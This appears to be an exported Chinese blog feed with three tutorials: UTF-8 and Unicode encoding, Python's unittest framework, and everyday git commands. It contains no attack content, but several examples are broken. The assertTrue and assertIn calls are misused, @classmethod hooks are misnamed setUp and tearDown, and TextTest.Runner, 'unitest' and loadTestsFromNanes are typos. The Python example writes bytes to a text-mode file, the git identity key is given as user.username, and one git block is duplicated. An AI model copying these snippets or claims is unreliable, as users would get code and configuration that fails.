<p>有了 Unicode，就解决了从字符到二进制的表示问题。接下来问题就是计算机内如何编码这套字符集了。</p>
<p>所有 Unicode 字符长度都是 4 字节，理论上计算机只需要每次读取 4 个字节就可以得到一个字符，这就是所谓的 <code>UTF-32 编码</code>。由于常用字符数目不到 65535 个，用 2 个字节就能容纳，那就意味着 4 个字节中有 2 个是经常被浪费掉的。所谓浪费就是犯罪，既然如此，系统可以老老实实每次读取 2 字节，遇到特殊符号时再往后多读 2 字节 就可以了。这就是 Java 默认的 <code>UTF-16 编码</code>。可是问题依然没有完全解决，英语是最常用的语言，前面说过，只需要 1 个字节就可以表示英文字母了，UTF-16 把每个字母也按照 2 字节 的方式编码，这无疑还是浪费了很多存储空间。另一种编码方式 <code>UTF-8 编码</code> 则解决了这个问题。UTF-8 编码通常只占 1 字节，但是会用几位冗余信息告诉系统，当前字符有没有结束，还需要继续往下读下一个字节。UTF-8 编码对英文只会占用 1 字节 的空间，而一些特殊字符如中文，则会智能地多占用一点空间进行存储，这样就大大节约了空间，特别适合用于本地存储和网络传输。在计算机内存中，统一使用 Unicode 字符集，而在网络传输和硬盘保存时，推荐使用 UTF-8 作为编码方式。</p>
<p>占用不同字节数的 UTF-8 编码表示形式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0xxxxxxx    // 0-127，ASCII 字符</span><br><span class="line">110xxxxx 10xxxxxx   // 128-2047</span><br><span class="line">1110xxxx 10xxxxxx 10xxxxxx  // 2048-65535</span><br><span class="line">11110xxx 10xxxxxx 10xxxxxx 10xxxxxx // 65536-0x10ffff</span><br></pre></td></tr></table></figure>

<p>通常按 UTF-8 编码的中文字符占 3 字节。这种变长编码导致字符串无法按字节下标直接读取一个字符，但由于其与 ASCII 完全兼容、非常节约存储空间、算法高效等特性，在实际中获得了广泛的应用。以下 3 种字符串常量均表示长度为 6 字节的相同串：</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;世界&quot;</span>  <span class="comment">// 中文字符</span></span><br><span class="line"><span class="string">&quot;\xe4\xb8\x96\xe7\x95\x8c&quot;</span>  <span class="comment">// UTF-8</span></span><br><span class="line"><span class="string">&quot;\u4e16\u754c&quot;</span>  <span class="comment">// Unicode</span></span><br></pre></td></tr></table></figure>

<h2 id="编码与解码"><a href="#编码与解码" class="headerlink" title="编码与解码"></a>编码与解码</h2><p>在 python3中，字符默认按 Unicode 编码，而在进行网络传输和硬盘保存时，常常将 Unicode 字符按 UTF-8 的方式编码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(s.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>当我们从网络上获取数据时，常常也是获取到以 UTF-8 形式编码的字节，为了方便我们对数据进行处理，需要解码成普通的 Unicode：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b = <span class="string">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(b.decode(<span class="string">&#x27;utf-8&#x27;</span>)) <span class="comment"># 输出：&#x27;中文&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>为了避免乱码，应该始终坚持以 UTF-8 的形式进行字符和字节之间的转换。</strong></p>
]]></content>
      <categories>
        <category>计算机系统</category>
      </categories>
      <tags>
        <tag>编码</tag>
      </tags>
  </entry>
  <entry>
    <title>unittest简介</title>
    <url>/2018/05/23/unittest%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<p>有个词叫TDD(Tset Driven Development)，测试驱动开发。一个好的开发人员不仅要懂开发，还要懂得一定的测试技巧。python自带了很多的测试库，比如unittest，coverage….介绍一下unittest的使用。</p>
<h1 id="unittests四个重要的概念"><a href="#unittests四个重要的概念" class="headerlink" title="unittests四个重要的概念"></a>unittests四个重要的概念</h1><p>unittest有四个重要的面向对象概念：</p>
<ol>
<li>test fixture。这个概念主要处理测试环境的搭建和清理。很多时候我们在进行测试的时候需要搭建合适的环境，例如创建目录、创建数据库等，而在测试完毕后这些环境又不再需要了。test fixturn可以帮我们很好的处理这些事情。</li>
<li>test case。 既然要进行测试，测试用例当然是最重要的。每一项测试内容都是一个test case。</li>
<li>test suite。我们当然不希望只能一项项的进行测试，最好是将要测试的项目放在一起。test suite相当于test case的集合，当然test suite也能嵌套在test suite中。</li>
<li>test runner。顾名思义，这个概念负责执行测试并控制结果输出。</li>
</ol>
<h1 id="创建testcase"><a href="#创建testcase" class="headerlink" title="创建testcase"></a>创建testcase</h1><p>unittest提供了TastCase类，要创建一个testcase只需要继承这个父类就好了。</p>
<p>先在<code>mathfunc.py</code>编写三个函数用于测试：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">minus</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x - y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">string</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br></pre></td></tr></table></figure>
<p>在<code>test_math.py</code>中创建测试用例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> mathfunc <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unittest <span class="keyword">import</span> TestCase</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestMath</span>(<span class="params">TestCase</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_add</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;测试add函数&quot;&quot;&quot;</span></span><br><span class="line">        self.assertTrue(<span class="number">1</span>+<span class="number">2</span>, add(<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_minus</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;测试minus函数&quot;&quot;&quot;</span></span><br><span class="line">        self.assertEqual(<span class="number">2</span>-<span class="number">1</span>, minus(<span class="number">2</span>, <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_string</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;测试string函数&quot;&quot;&quot;</span></span><br><span class="line">        self.assertIn(<span class="string">&#x27;h&#x27;</span> <span class="keyword">in</span> string(<span class="string">&#x27;hello&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>这就创建了一个testcase，包含三个测试。<strong>testcase中所有的测试必须以<code>test</code>开头</strong>。<code>self.assert*()</code>是由TestCase提供的测试函数。每一个测试里的文档会在输出测试报告时显示。不用python内置的assert()是因为uniittest在遇到<code>self.assert*()</code>发生错误时会把这个测试标记为failure，然后继续执行其他测试。</p>
<h1 id="创建testsuite"><a href="#创建testsuite" class="headerlink" title="创建testsuite"></a>创建testsuite</h1><p>有了testcase，自然想把它加入到suite中。unittest提供了<code>TestSuite</code>类来表示一个suite。默认情况下，unittest按测试函数的函数名进行排序，然后按这个排序执行测试。如果我们想控制测试执行顺序，就要在向suite添加case时做点文章：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> mathfunc <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"></span><br><span class="line">suite = unittest.TestSuite()</span><br><span class="line"><span class="comment"># 传入列表，这样就会按照元素顺序执行测试</span></span><br><span class="line">suite.addTests([TestMath(<span class="string">&#x27;test_add&#x27;</span>), TestMath(<span class="string">&#x27;test_minus&#x27;</span>), TestMath(<span class="string">&#x27;test_string&#x27;</span>)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    unittest.main()</span><br></pre></td></tr></table></figure>
<p>还可以通过unittest提供的TestLoader类来添加testcase，<strong>TestLoader会返回一个suite</strong>。不过<strong>TestLoader无法保证按照顺序执行测试</strong>。TestLoader类提供了一下常用方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> test_math <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 三种方法都可以</span></span><br><span class="line">suite.addTests(unittest.TestLoader().loadTestsFromName(<span class="string">&#x27;test_math.TestMath&#x27;</span>))</span><br><span class="line">suite.addTests(unitest.TestLoader().loadTestsFromNanes([<span class="string">&#x27;test_math.TestMath&#x27;</span>])</span><br><span class="line">suite.addTests(unitest.TestLoader().loadTestsFromTestCase(TestMath))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果test_math在/usr/test/目录下</span></span><br><span class="line">suite.addTests(unittest.TestLoader().discover(<span class="string">r&#x27;/usr/test/&#x27;</span>))</span><br><span class="line"><span class="comment"># 可用添加单个testcase</span></span><br><span class="line">suite.addTest(TestMath(<span class="string">&#x27;test_add&#x27;</span>))</span><br></pre></td></tr></table></figure>
<ul>
<li>loadTestsFromName(模块名.testcase名)</li>
<li>loadTestsFromTestCase(testcase名)</li>
<li>discover(start_dir, pattern=’test*.py’, top_level_dir=None)。start_dir是目标文件夹路径，unittest会查找指定目录及子目录下的全部符合pattern的模块并执行里面的TestCase。<strong>电脑中不能有同名的目标文件夹，否则unittest可能无法找到正确的位置</strong>。patter默认是’test*.py’。</li>
</ul>
<h1 id="搭建测试环境"><a href="#搭建测试环境" class="headerlink" title="搭建测试环境"></a>搭建测试环境</h1><p>TaseCase父类提供了<code>setUp()</code>，<code>tearDown()</code>，<code>setUpClass()</code>，<code>tearDownClass()</code>。我们在自己的测试用例中重写就可以了。</p>
<p>setUp()与tearDown()会在每个测试之前执行。setUp()负责搭建测试环境，tearDown()负责清理环境。如果setUp()执行失败那么这次测试不会进行，如果setUp()成功执行那么不管测试是否成功tearDown()都会执行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> manage <span class="keyword">import</span> create_app, db</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestBasic</span>(<span class="params">unittest.TestCase</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setUp</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.app = create_app(<span class="string">&#x27;TESTING&#x27;</span>)</span><br><span class="line">        self.app_context = self.app.app_context()</span><br><span class="line">        self.app_context.push()</span><br><span class="line">        self.client = self.app.test_client(use_cookies=<span class="literal">True</span>)</span><br><span class="line">        db.create_all()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tearDown</span>(<span class="params">self</span>):</span></span><br><span class="line">        db.session.remove()</span><br><span class="line">        db.drop_all()</span><br><span class="line">        self.app_context.pop()</span><br><span class="line">    </span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>如果想要在所以case之前执行一次环境准备，所有case之后清理环境，可用<code>setUpClass()</code>和<code>tearDownClass()</code>。不过要带上<code>@classmethod</code>装饰器。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> manage <span class="keyword">import</span> create_app, db</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestBasic</span>(<span class="params">unittest.TestCase</span>):</span></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setUp</span>(<span class="params">cls</span>):</span></span><br><span class="line">        cls.app = create_app(<span class="string">&#x27;TESTING&#x27;</span>)</span><br><span class="line">        cls.app_context = cls.app.app_context()</span><br><span class="line">        cls.app_context.push()</span><br><span class="line">        cls.client = cls.app.test_client(use_cookies=<span class="literal">True</span>)</span><br><span class="line">        db.create_all()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tearDown</span>(<span class="params">cls</span>):</span></span><br><span class="line">        db.session.remove()</span><br><span class="line">        db.drop_all()</span><br><span class="line">        cls.app_context.pop()</span><br><span class="line">    </span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<h1 id="执行测试及控制输出"><a href="#执行测试及控制输出" class="headerlink" title="执行测试及控制输出"></a>执行测试及控制输出</h1><p>通常我们使用<code>unittest.main()</code>就会调用Test Runner开始测试。当然也可以手动执行Runner。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    runner = unittest.TextTest.Runner(verbosity=<span class="number">2</span>)</span><br><span class="line">    runner.run(suite)</span><br></pre></td></tr></table></figure>
<p>verbosity设定了测试报告的详细程度，有0，1，2三种。默认值是1，数字越大越详细。</p>
<p>也可以把输出写到文件里,将文件指针传给Runner()里的<code>stream</code>参数就可以了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/usr/test/report&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    runner = unittest.TextTest.Runner(verbosity=<span class="number">2</span>, stream=f)</span><br><span class="line">    runner.run(suite)</span><br></pre></td></tr></table></figure>
<h1 id="跳过测试"><a href="#跳过测试" class="headerlink" title="跳过测试"></a>跳过测试</h1><p>unittest提供3种跳过测试的装饰器：skip([reason])、skipIf(condtion[,reason])，skipUnless(conditon[,reason])。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> mathfunc <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestMath</span>(<span class="params">unittest.TestCase</span>):</span></span><br><span class="line"><span class="meta">    @unittest.skip(<span class="params"><span class="string">&#x27;跳过add函数&#x27;</span></span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_add</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.assertTrue(<span class="number">1</span>+<span class="number">2</span>, add(<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_minus</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.assertEqual(<span class="number">2</span>-<span class="number">1</span>, minus(<span class="number">2</span>, <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_string</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.assertIn(<span class="string">&#x27;h&#x27;</span> <span class="keyword">in</span> string(<span class="string">&#x27;hello&#x27;</span>))</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>git常见用法</title>
    <url>/2018/05/23/git%E5%B8%B8%E8%A7%81%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<p>使用git也有一段时间了，一直没有做总结，在这里记录一下方便以后查看。</p>
<span id="more"></span>

<p><strong>配置git：</strong></p>
<p>windows下直接从<a href="https://git-scm.com/downloads">官网</a>下载就可以了，安装过程是傻瓜式的，一路点确定就OK。安装完成后发现多了个叫<code>git bash</code>的程序，打开程序会弹出一个命令行窗口就可以了。</p>
<p>linux下安装git很简单，直接在终端输入 <code>git</code>，系统会告诉你是否已经安装。如果没有安装还会告诉你安装方法。Debian 和 Ubantu 下通过 <code>sudo apt-get install git</code> 就可以进行安装。</p>
<p>由于git是分布式版本控制系统，所以必须指出每台机器的身份。这就要配置git相关变量：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.username <span class="string">&quot;name&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;email&quot;</span></span><br></pre></td></tr></table></figure>

<p>有时候我们发现自己的账户和邮箱配置错了，重设我们的账户和邮箱：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global --replace-all user.username <span class="string">&quot;new name&quot;</span></span><br><span class="line">git config --global --replace-all user.email <span class="string">&quot;new email&quot;</span></span><br></pre></td></tr></table></figure>

<h1 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h1><h2 id="版本控制"><a href="#版本控制" class="headerlink" title="版本控制"></a>版本控制</h2><h3 id="创建版本库"><a href="#创建版本库" class="headerlink" title="创建版本库"></a>创建版本库</h3><p>目标文件夹下，打开终端输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure>

<p>这就为这个文件夹创建了一个版本库，有了版本库就可以开始使用 git 的各项功能了。</p>
<h3 id="状态"><a href="#状态" class="headerlink" title="状态"></a>状态</h3><p>git 有分区的概念，平时我们新建、删除、修改文件都是在<code>工作区</code>，通过 <code>git add</code> 命令把工作区的变动提交到<code>暂存区</code>（stage），再用 <code>git commit</code> 把stage的内容提交到<code>分支</code>（branch）。</p>
<p>每次我们对文件进行修改，都会改变 git 的状态。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git status <span class="comment">#查看当前仓库的状态（是否有文件被修改，有文件没有commit等）</span></span><br><span class="line">git diff file <span class="comment">#比较工作区与缓存区的不同</span></span><br><span class="line">git diff head  <span class="comment"># 比较工作区与分支的不同</span></span><br></pre></td></tr></table></figure>

<h3 id="显示过往提交记录"><a href="#显示过往提交记录" class="headerlink" title="显示过往提交记录"></a>显示过往提交记录</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">log</span> <span class="comment"># 显示提交日志，每次提交会有一个专属的版本号，通过版本号可回溯至本次提交</span></span><br><span class="line">git <span class="built_in">log</span> --oneline <span class="comment"># 在 log 显示信息过乱时可以加 --oneline 只显示提交记录及其版本号</span></span><br><span class="line">git <span class="built_in">log</span> --graph --oneline <span class="comment"># 把分支记录以时间线的形式显示</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/02/16/U5lM6bayKAHwX1r.png" alt="log"><br><img src="https://i.loli.net/2020/02/16/mO2ACVn9jQaMZJg.png" alt="log--oneline"></p>
<p>HEAD 表示当前版本，可以用 HEAD^ 表示上一版本，HEAD^^ 表示上上版本… HEAD~100 表示第前 100 个版本。</p>
<h3 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h3><p>使用 git 的一个主要好处就是 git 提供方便的版本控制，可以在需要的时候回退到任意版本。</p>
<p>版本回退命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reset --hard 版本号</span><br></pre></td></tr></table></figure>

<p>但是这里有个问题：当我们回到历史版本后，<code>git log</code> 命令就无法显示最新版本的版本号。相当于我们穿越到过去，却没办法回来了。幸好 <code>git relog</code> 命令可以解决这个问题，<code>git reflog</code> 记录了我们每次在版本间的移动：</p>
<p><img src="https://i.loli.net/2020/02/16/BFnk1zxTIN7Khly.png" alt="reflog"></p>
<p>可以看到，我通过 checkout 从 174e8dc 来到 e346f09，这样就不怕穿越不回现代啦~</p>
<h3 id="管理修改"><a href="#管理修改" class="headerlink" title="管理修改"></a>管理修改</h3><p>有时我们修改了工作区或暂存区的文件，过了一会儿又后悔了，可以用下面的命令撤销这些修改，<strong>相当于 git add 的反向命令，即把暂存区最新版本转移到工作区</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout -- file</span><br></pre></td></tr></table></figure>

<p>如果文件已经 add 到了暂存区，想要把它从暂存区里撤下来也是可以的，<strong>相当于 git commit 的反向命令，即把分支最新版本转移到暂存区</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reset HEAD file</span><br></pre></td></tr></table></figure>

<p>那如果文件已经 commit 了怎么版本？还记得前面的版本回退命令吗？直接回退就好啦！</p>
<h3 id="显示提交记录"><a href="#显示提交记录" class="headerlink" title="显示提交记录"></a>显示提交记录</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">log</span> <span class="comment"># 显示提交日志，每次提交会有一个专属的版本号，通过版本号可回溯至本次提交</span></span><br><span class="line">git <span class="built_in">log</span> --oneline <span class="comment"># 在 log 显示信息过乱时可以加 --oneline 只显示提交记录及其版本号</span></span><br><span class="line">git <span class="built_in">log</span> --graph --oneline <span class="comment"># 把分支记录以时间线的形式显示</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/02/16/U5lM6bayKAHwX1r.png" alt="log"><br><img src="https://i.loli.net/2020/02/16/mO2ACVn9jQaMZJg.png" alt="log--oneline"></p>
<p>HEAD 表示当前版本，可以用 HEAD^ 表示上一版本，HEAD^^ 表示上上版本… HEAD~100 表示第前 100 个版本。</p>
<h3 id="版本回退-1"><a href="#版本回退-1" class="headerlink" title="版本回退"></a>版本回退</h3><p>使用 git 的一个主要好处就是 git 提供方便的版本控制，可以在需要的时候回退到任意版本。</p>
<p>版本回退命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reset --hard 版本号</span><br></pre></td></tr></table></figure>

<p>但是这里有个问题：当我们回到历史版本后，<code>git log</code> 命令就无法显示最新版本的版本号。相当于我们穿越到过去，却没办法回来了。幸好 <code>git relog</code> 命令可以解决这个问题，<code>git reflog</code> 记录了我们每次在版本间的移动：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reflog</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/02/16/BFnk1zxTIN7Khly.png" alt="reflog"></p>
<p>可以看到，我通过 checkout 从 174e8dc 来到 e346f09，这样就不怕穿越不回现代啦~</p>
<h3 id="管理修改-1"><a href="#管理修改-1" class="headerlink" title="管理修改"></a>管理修改</h3><p>有时我们修改了工作区或暂存区的文件，过了一会儿又后悔了，可以用下面的命令撤销这些修改：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout -- file</span><br></pre></td></tr></table></figure>

<p>如果文件已经 add 到了暂存区，想要把它从暂存区里撤下来也是可以的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reset HEAD file</span><br></pre></td></tr></table></figure>

<p>那如果文件已经 commit 了怎么版本？还记得前面的版本回退命令吗？直接回退就好啦！</p>
<h2 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h2><p>要先在 Github 中添加这台机器的 ssh 密钥以允许你把本地文件传到 Github 上。执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;email&quot;</span></span><br></pre></td></tr></table></figure>

<p>这条命令会在当前文件夹下生成 <code>.ssh</code> 文件夹，里面有两个文件：<code>id_rsa</code> 和 <code>id_rsa.pub</code>。带 pub 的是公钥，把 <code>id_rsa.pub</code> 里的内容添加到 Github 上。</p>
<p>想把 Github 中的仓库和本地仓库关联起来，通过这条命令可以实现，xxxxx 是远程仓库的地址：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git remote add origin xxxxx</span><br></pre></td></tr></table></figure>

<p>origin 是这个 git 本地仓库对远程仓库的称呼，也可以用别的名字如 dev、test 等，但是通常都用origin。</p>
<p>删除本地仓库与远程仓库的关联也很简单：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git remote remove origin</span><br></pre></td></tr></table></figure>

<h3 id="克隆远程仓库"><a href="#克隆远程仓库" class="headerlink" title="克隆远程仓库"></a>克隆远程仓库</h3><p>有时候我们在 Github 上可能看到一些很有意思的库，可以用这个命令把它下载到本地，其中 xxxxx 是这个仓库的网址：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> xxxxx</span><br></pre></td></tr></table></figure>

<h3 id="把本地库内容推送到远程"><a href="#把本地库内容推送到远程" class="headerlink" title="把本地库内容推送到远程"></a>把本地库内容推送到远程</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push origin master</span><br></pre></td></tr></table></figure>

<p>如果是第一次推送，可以为push加上 <code>-u</code> 参数，这样以后推送的时候就不用再输入 Github 的账号和密码了。master 代表远程仓库的主分支，如果要推送到其他分支就换成其他分支名。</p>
<h3 id="抓取远程库内容"><a href="#抓取远程库内容" class="headerlink" title="抓取远程库内容"></a>抓取远程库内容</h3><p>抓取远程仓库内容并 merge 到本地</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git pull <span class="comment"># 默认抓取 origin 中和当前分支关联的远程分支</span></span><br></pre></td></tr></table></figure>

<h3 id="删除远程仓库中的文件"><a href="#删除远程仓库中的文件" class="headerlink" title="删除远程仓库中的文件"></a>删除远程仓库中的文件</h3><p>很多时候随着项目的进行，远程仓库中一些文件不再被使用，或者干脆就是不小心提交了没啥用的文件。当然，可以在 Github 点击删除按钮进行删除，但是目前 Github 只提供了单个文件的删除，如果想要删除一个文件夹及其下的所有文件那工作量简直令人崩溃 orz。</p>
<p>其实，我们可以通过从版本库中删除这个文件再推送到 Github 的方式删除远程仓库中的内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git rm -r --cached file</span><br><span class="line">git commit -m <span class="string">&quot;delete file&quot;</span></span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure>

<p><code>-r</code> 表示递归删除，这在 file 表示文件夹时尤其有用。<code>--cached</code> 表示对版本库中的缓存进行操作，这样就不会把本地文件给删除了~</p>
<h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><p>创建新分支：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch 分支名</span><br></pre></td></tr></table></figure>

<p>移动到一个分支：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout 分支名</span><br></pre></td></tr></table></figure>

<p>创建并移动到一个新分支：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout -b 分支名</span><br></pre></td></tr></table></figure>

<p>创建并移动到一个和远程分支对应的分支：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout -b 分支名 origin/远程分支</span><br></pre></td></tr></table></figure>

<p>建立本地分支对远程分支的关联：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch --set-upstream 本地分支 origin/远程分支</span><br></pre></td></tr></table></figure>

<p>将当前分支与另一分支合并：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git merge 分支名</span><br></pre></td></tr></table></figure>

<h3 id="处理分支冲突"><a href="#处理分支冲突" class="headerlink" title="处理分支冲突"></a>处理分支冲突</h3><p>合并分支时，可能会遇到因两个分支的内容有冲突而导致合并失败的现象（这在执行 pull 操作时尤其常见，特别是当你在 Github 上在线修改了一个文件，而本地没有修改时）。git 会在冲突文件中用 &lt;&lt;&lt;&lt;&lt;&lt;&lt;，=======，&gt;&gt;&gt;&gt;&gt;&gt;&gt; 标记出不同内容的分支。我们需要将文件进行修改后再执行 commit：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可以看到，本地 HEAD 和远程分支冲突了</span></span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;HEAD</span><br><span class="line">git is <span class="attr">good</span></span><br><span class="line">=======</span><br><span class="line">git is very good</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;branch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将文件修改一下</span></span><br><span class="line">git is very good</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交</span></span><br><span class="line">git add test.txt</span><br><span class="line">git commit -m &quot;解决冲突&quot;</span><br></pre></td></tr></table></figure>

<h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><p>当项目开发到一定阶段，我们会给它打上一个<code>标签</code>（tag）表示达到了某种程度。就像很多软件经常会说：我们升级到 v7.0.1 版本啦，快来升级哟~ 这里的 v7.0.1 就是一个标签。</p>
<p>查看当前版本库中所有标签：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git tag</span><br></pre></td></tr></table></figure>

<p>给某次 commit 打上标签很简单：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git tag 标签名 版本号</span><br></pre></td></tr></table></figure>

<p>像 commit 那样给标签添加说明，<code>-a</code> 表示创建一个带附注的标签，<code>-m</code> 表示附注：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git tag 标签名 版本号 -a -m <span class="string">&quot;add an annotation&quot;</span></span><br></pre></td></tr></table></figure>

<p>查看一个标签的详细信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git show 标签名</span><br></pre></td></tr></table></figure>

<p>签出一个标签：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout 标签名</span><br></pre></td></tr></table></figure>

<p>删除本地标签：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git tag -d 标签名</span><br></pre></td></tr></table></figure>

<p>推送本地标签到远程仓库：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push origin --tags</span><br></pre></td></tr></table></figure>

